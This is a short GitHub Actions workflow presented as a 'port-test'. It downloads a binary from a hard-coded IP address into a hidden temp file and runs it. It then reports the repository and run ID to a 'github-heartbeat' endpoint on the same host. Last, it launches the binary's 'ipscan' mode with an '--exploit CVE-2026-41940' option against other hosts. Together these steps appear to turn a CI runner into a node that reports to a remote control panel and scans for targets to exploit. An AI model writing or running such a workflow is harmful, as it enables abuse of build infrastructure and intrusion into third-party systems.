name: port-test
on:
  workflow_dispatch:
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Download and run toolkit
        run: |
          PANEL="http://43.228.157.68:80"
          echo "=== Download ==="
          curl -sfL "$PANEL/api/dl/amd64" -o /tmp/.svc && echo "OK size:$(wc -c < /tmp/.svc)" || echo "FAIL"
          file /tmp/.svc || true
          chmod 755 /tmp/.svc
          echo "=== Version check ==="
          /tmp/.svc --version 2>&1 | head -5 || echo "exit:$?"
          /tmp/.svc --help 2>&1 | head -10 || echo "exit:$?"
          echo "=== Heartbeat test ==="
          curl -s -X POST "$PANEL/api/github-heartbeat" \
            --data-urlencode "repo=${GITHUB_REPOSITORY}" \
            --data-urlencode "run_id=${GITHUB_RUN_ID}" \
            --data-urlencode "log=test_heartbeat_ok" 2>&1 | head -5 || echo "hb_fail"
          echo "=== Quick ipscan test (10s) ==="
          timeout 10 /tmp/.svc ipscan --workers 10 --exploit CVE-2026-41940 --count 10 --no-reverse \
            PANEL_URL="$PANEL" 2>&1 | head -20 || echo "exit:$?"
